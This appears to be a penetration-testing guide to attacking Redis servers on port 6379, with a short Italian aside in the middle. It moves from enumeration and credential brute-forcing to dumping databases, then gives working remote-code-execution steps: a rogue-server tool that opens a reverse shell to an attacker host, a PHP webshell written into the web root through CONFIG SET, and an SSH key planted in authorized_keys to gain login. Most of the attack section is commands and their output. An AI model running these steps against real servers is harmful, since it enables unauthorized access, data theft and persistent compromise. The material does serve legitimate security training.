**Default port:** 6379

## Automatic Enumeration

Some automated tools that can help to obtain info from a redis instance:

```bash

nmap --script redis-info -sV -p 6379 <IP>

msf> use auxiliary/scanner/redis/redis_server

```

## Manual Enumeration

### Banner

Redis is a **text based protocol**, you can just **send the command in a socket** and the returned values will be readable. Also remember that Redis can run using **ssl/tls** (but this is very weird).

In a regular Redis instance you can just connect using `nc` or you could also use `redis-cli`:

```bash

nc -vn 10.10.10.10 6379

redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools

```

The **first command** you could try is **`info`**. It **may return output with information** of the Redis instance **or something** like the following is returned:

```

-NOAUTH Authentication required.

```

In this last case, this means that **you need valid credentials** to access the Redis instance.

### Redis Authentication

**By default** Redis can be accessed **without credentials**. However, it can be **configured** to support **only password, or username + password**.\

It is possible to **set a password** in _**redis.conf**_ file with the parameter `requirepass` **or temporary** until the service restarts connecting to it and running: `config set requirepass p@ss$12E45`.\

Also, a **username** can be configured in the parameter `masteruser` inside the _**redis.conf**_ file.


If only password is configured the username used is "**default**".\

Also, note that there is **no way to find externally** if Redis was configured with only password or username+password.


In cases like this one you will **need to find valid credentials** to interact with Redis so you could try to [**brute-force**](../generic-methodologies-and-resources/brute-force.md#redis) it.\

**In case you found valid credentials you need to authenticate the session** after establishing the connection with the command:

```bash

AUTH <username> <password>

```

**Valid credentials** will be responded with: `+OK`

### **Authenticated enumeration**

If the Redis instance is accepting **anonymous** connections or you found some **valid credentials**, you can **start enumerating** the service with the following commands:

```bash

INFO

[ ... Redis response with info ... ]

client list

[ ... Redis response with connected clients ... ]

CONFIG GET *

[ ... Get config ... ]

```

**Other Redis commands** [**can be found here**](https://redis.io/topics/data-types-intro) **and** [**here**](https://lzone.de/cheat-sheet/Redis)**.**\

Note that the **Redis commands of an instance can be renamed** or removed in the _redis.conf_ file. For example this line will remove the command FLUSHDB:

```

rename-command FLUSHDB ""

```

More about configuring securely a Redis service here: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

You can also **monitor in real time the Redis commands** executed with the command **`monitor`** or get the top **25 slowest queries** with **`slowlog get 25`**

Find more interesting information about more Redis commands here: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Dumping Database**

Inside Redis the **databases are numbers starting from 0**. You can find if anyone is used in the output of the command `info` inside the "Keyspace" chunk:

![](<../.gitbook/assets/image (315).png>)

In that example the **database 0 and 1** are being used. **Database 0 contains 4 keys and database 1 contains 1**. By default Redis will use database 0. In order to dump for example database 1 you need to do:

```bash

SELECT 1

[ ... Indicate the database ... ]

KEYS *

[ ... Get Keys ... ]

GET <KEY>

[ ... Get Key ... ]

```

In case you get the follwing error `-WRONGTYPE Operation against a key holding the wrong kind of value` while running `GET <KEY>` it's because the key may be something else than a string or an integer and requires a special operator to display it.

To know the type of the key, use the `TYPE` command, example below for list and hash keys.

```

TYPE <KEY>

[ ... Type of the Key ... ]

LRANGE <KEY> 0 -1

[ ... Get list items ... ]

HGET <KEY> <FIELD>

[ ... Get hash item ... ]

```

**Dump the database with npm**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **or python** [**redis-utils**](https://pypi.org/project/redis-utils/)

## Redis RCE

### REDIS-ROGUE-SERVER

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) can automatically get an interactive shell or a reverse shell

```

./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>

```

**ATTENZIONE**
La versione original non ha flag per l'autenticazione con password. Ho trovato questa versione cinese che ha di default la -v e altre flag impostabili:

- https://github.com/Dliv3/redis-rogue-server/blob/master/README_EN.md
- https://github.com/Dliv3/redis-rogue-server

Another great guide that explains the exploitation process more in depth
https://paper.seebug.org/977/

Original paper:
https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf



### Webshell

Info from [**here**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). You must know the **path** of the **Web site folder**:

```

root@Urahara:~# redis-cli -h 10.85.0.52

10.85.0.52:6379> config set dir /usr/share/nginx/html

OK

10.85.0.52:6379> config set dbfilename redis.php

OK

10.85.0.52:6379> set test "<?php phpinfo(); ?>"

OK

10.85.0.52:6379> save

OK

```

​If the webshell access exception, you can empty the database after backup and try again, remember to restore the database.

### SSH

Please be aware **`config get dir`** result can be changed after other manually exploit commands. Suggest to run it first right after login into Redis. In the output of **`config get dir`** you could find the **home** of the **redis user** (usually _/var/lib/redis_ or _/home/redis/.ssh_), and knowing this you know where you can write the `authenticated_users` file to access via ssh **with the user redis**. If you know the home of other valid user where you have writable permissions you can also abuse it:

1. Generate a ssh public-private key pair on your pc: **`ssh-keygen -t rsa`**

2. Write the public key to a file : **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**

3. Import the file into redis : **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**

4. Save the public key to the **authorized\_keys** file on redis server:

```

root@Urahara:~# redis-cli -h 10.85.0.52

10.85.0.52:6379> config set dir /var/lib/redis/.ssh

OK

10.85.0.52:6379> config set dbfilename "authorized_keys"

OK

10.85.0.52:6379> save

OK

```

5. Finally, you can **ssh** to the **redis server** with private key : **ssh -i id\_rsa redis@10.85.0.52**

**This technique is automated here:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)